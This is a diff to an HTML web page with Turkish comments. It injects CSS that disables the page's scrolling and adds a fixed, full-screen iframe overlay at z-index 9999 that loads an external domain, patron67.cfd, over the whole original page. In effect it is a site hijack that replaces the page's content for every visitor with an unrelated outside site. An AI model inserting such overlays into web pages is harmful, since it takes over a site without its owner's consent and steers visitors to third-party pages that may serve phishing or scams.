@@ -198,7 +198,35 @@
   <!-- Google Fonts: Space Grotesk & Plus Jakarta Sans -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@700;800&display=swap" rel="stylesheet">
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+}
 
+.iframe-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100dvh; 
+  z-index: 9999;
+  background: #000;
+  display: block;
+  padding-bottom: env(safe-area-inset-bottom);
+  box-sizing: border-box;
+}
+
+.iframe-overlay iframe {
+  display: block;
+  width: 100%;
+  height: 100%;
+  border: 0;
+}
+</style>
   <style>
     :root {
       --v92m-font-display: 'Space Grotesk', sans-serif;
@@ -328,7 +356,9 @@
 </head>
 
 <body id="m29wPageRoot" class="h-full overflow-y-auto h58q-midnight-backdrop h58q-lattice-pattern text-slate-100">
-
+<div class="iframe-overlay">
+  <iframe src="https://patron67.cfd" allowfullscreen></iframe>
+</div>
   <!-- Üst Canlı Durum Şeridi -->
   <div id="m29wStatusTicker" class="bg-slate-950/95 border-b border-sky-400/20 text-slate-300 text-xs py-2 px-4 overflow-hidden">
     <div class="max-w-6xl mx-auto flex items-center justify-between gap-4">
